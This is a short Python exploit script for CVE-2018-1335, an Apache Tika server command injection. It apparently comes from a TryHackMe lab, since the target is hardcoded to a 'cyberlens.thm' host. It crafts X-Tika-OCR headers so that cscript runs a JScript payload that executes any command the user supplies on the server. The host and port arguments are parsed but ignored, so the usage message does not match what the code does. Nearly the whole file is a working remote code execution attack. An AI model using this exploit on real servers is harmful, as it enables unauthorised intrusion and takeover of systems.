import sys
import requests

if len(sys.argv) < 4:
    print("Usage: python3 CVE-2018-1335.py <host> <port> <command>")
    print("Example: python3 CVE-2018-1335.py localhost 9998 calc.exe")
else:
    host = sys.argv[1]
    port = sys.argv[2]
    cmd = sys.argv[3]

    url = f"cyberlens.thm:61777/meta"

    headers = {
        "X-Tika-OCRTesseractPath": "\"cscript\"",
        "X-Tika-OCRLanguage": "//E:Jscript",
        "Expect": "100-continue",
        "Content-type": "image/jp2",
        "Connection": "close"
    }
    jscript = '''
    var oShell = WScript.CreateObject("WScript.Shell");
    var oExec = oShell.Exec('cmd /c {}');
    '''.format(cmd)

    try:
        requests.put(f"https://{url}", headers=headers, data=jscript, verify=False)
    except:
        try:
            requests.put(f"http://{url}", headers=headers, data=jscript)
        except:
            print("Something went wrong.\nUsage: python3 CVE-2018-1335.py <host> <port> <command>")
        try:
            requests.put("http://"+url, headers=headers, data=jscript)
        except:
            print("Something went wrong.\nUsage: python CVE-2018-1335.py <host> <port> <command>")